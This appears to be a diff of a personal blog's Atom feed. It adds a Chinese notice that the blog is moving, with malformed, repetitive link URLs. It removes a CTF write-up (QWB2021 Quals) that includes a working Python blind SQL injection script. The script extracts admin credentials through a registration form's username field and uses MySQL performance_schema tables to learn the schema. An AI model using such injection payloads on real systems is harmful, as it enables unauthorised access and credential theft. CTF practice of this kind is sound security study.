@@ -6,7 +6,7 @@
   <link href="https://kinseyy.github.io/atom.xml" rel="self"/>
   
   <link href="https://kinseyy.github.io/"/>
-  <updated>2025-08-11T11:35:38.400Z</updated>
+  <updated>2025-08-11T12:19:38.101Z</updated>
   <id>https://kinseyy.github.io/</id>
   
   <author>
@@ -15,6 +15,23 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>博客迁移通知</title>
+    <link href="https://kinseyy.github.io/2025/08/11/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E9%80%9A%E7%9F%A5/"/>
+    <id>https://kinseyy.github.io/2025/08/11/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E9%80%9A%E7%9F%A5/</id>
+    <published>2025-08-11T12:13:56.000Z</published>
+    <updated>2025-08-11T12:19:38.101Z</updated>
+    
+    <content type="html"><![CDATA[<p>新博客：<a href="https://kinsey973.top,博客迁移啦,博客迁移啦,博客迁移啦,博客迁移啦,博客迁移啦,博客迁移啦,博客迁移啦,博客迁移啦,博客迁移啦,博客迁移啦,博客迁移啦/">https://kinsey973.top，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦</a></p><span id="more"></span><p>由于本博主心血来潮，想换个博客框架，最后选了新一代静态博客框架valaxy，由云游君开发的，放个<a href="https://valaxy.site/guide/config">链接</a></p><p>从今天起，本博客正式迁移到<a href="https://kinsey973.top,此外,本博客会保留,由于一些语法不兼容问题,本博客的文章就留这了,不迁移过去了(绝对不是我觉得好麻烦),那么就这样吧/">https://kinsey973.top，此外，本博客会保留，由于一些语法不兼容问题，本博客的文章就留这了，不迁移过去了(绝对不是我觉得好麻烦),那么就这样吧</a></p>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;新博客：&lt;a href=&quot;https://kinsey973.top,博客迁移啦,博客迁移啦,博客迁移啦,博客迁移啦,博客迁移啦,博客迁移啦,博客迁移啦,博客迁移啦,博客迁移啦,博客迁移啦,博客迁移啦/&quot;&gt;https://kinsey973.top，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦&lt;/a&gt;&lt;/p&gt;</summary>
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>Hello World</title>
@@ -450,26 +467,6 @@
     
     
     <category term="刷题笔记" scheme="https://kinseyy.github.io/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>[QWB2021 Quals]托纳多</title>
-    <link href="https://kinseyy.github.io/2025/03/16/QWB2021-Quals-%E6%89%98%E7%BA%B3%E5%A4%9A/"/>
-    <id>https://kinseyy.github.io/2025/03/16/QWB2021-Quals-%E6%89%98%E7%BA%B3%E5%A4%9A/</id>
-    <published>2025-03-16T13:45:31.000Z</published>
-    <updated>2025-03-16T13:55:27.548Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="QWB2021-Quals-托纳多"><a href="#QWB2021-Quals-托纳多" class="headerlink" title="[QWB2021 Quals]托纳多"></a>[QWB2021 Quals]托纳多</h2><p>我们在自己的注册页面的用户名上发现了明显的过滤</p><p>当我们输入<code>&quot;,#,sys,&lt;,&gt;,=, like ,tables ,coluns </code>等关键字时会报错</p><p>所以我们在第一步需要拿到admin的密码</p><p>参考 <a href="https://guokeya.github.io/post/SZkQ4b1G/">https://guokeya.github.io/post/SZkQ4b1G/</a></p><p>guoke师傅使用了performance_schema.file_instances来拿到数据库文件路径</p><p>例如test数据库，数据库文件路径就是&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;test&#x2F;表.frm</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503162153999.png" alt="image-20250316215342826" loading="lazy"></p><p>下一步我们需要知道表结构</p><p>mysql会记录执行的sql语句到<code>performance_schema.events_statements_summary_by_digest</code>,同理<code>select (DIGEST_TEXT) FROM performance_schema.events_statements_summary_by_digest</code>即可得到表结构</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span>  <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">300</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">130</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(i&lt;<span class="number">30</span>):</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        url = <span class="string">&quot;http://f96ea2c5-35a7-444f-8eee-4a086e4797dd.node3.buuoj.cn/register.php?username=&#x27; or  if((ascii(substr((select group_concat(qwbqwbqwbuser,0x7e,qwbqwbqwbpass)  FROM qwbtttaaab111e ),&quot;</span> + <span class="built_in">str</span>(a) + <span class="string">&quot;,1)) in (&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;)),1,0) or &#x27;0&amp;password=12&quot;</span></span><br><span class="line">        <span class="comment">#admin~we111c000me_to_qwb</span></span><br><span class="line">        <span class="comment">#url = &quot;http://eci-2zece4hj2xonmso7ryud.cloudeci1.ichunqiu.com:8888/register.php?username=&#x27; or  if((ascii(substr((select (DIGEST_TEXT)  FROM performance_schema.events_statements_summary_by_digest where SCHEMA_NAME in (&#x27;qwb&#x27;) limit 2,1),&quot;+str(a)+&quot;,1)) in (&quot;+str(i)+&quot;)),1,0) or &#x27;0&amp;password=12&quot;</span></span><br><span class="line">        <span class="comment">#INSERT INTO `qwbtttaaab111e` ( `qwbqwbqwbuser` , `qwbqwbqwbpass` ) VALUES (...)</span></span><br><span class="line">        <span class="comment">#url = &quot;http://eci-2zece4hj2xonmso7ryud.cloudeci1.ichunqiu.com:8888/register.php?username=&#x27; or  if((ascii(substr((select (file_name)  FROM performance_schema.file_instances limit 150,1),&quot;+str(a)+&quot;,1)) in (&quot;+str(i)+&quot;)),1,0) or &#x27;0&amp;password=12&quot;</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;this username&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> r.text):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;QWB2021-Quals-托纳多&quot;&gt;&lt;a href=&quot;#QWB2021-Quals-托纳多&quot; class=&quot;headerlink&quot; title=&quot;[QWB2021 Quals]托纳多&quot;&gt;&lt;/a&gt;[QWB2021 Quals]托纳多&lt;/h2&gt;&lt;p&gt;我们在自己的注册</summary>
-      
-    
-    
     
     
   </entry>
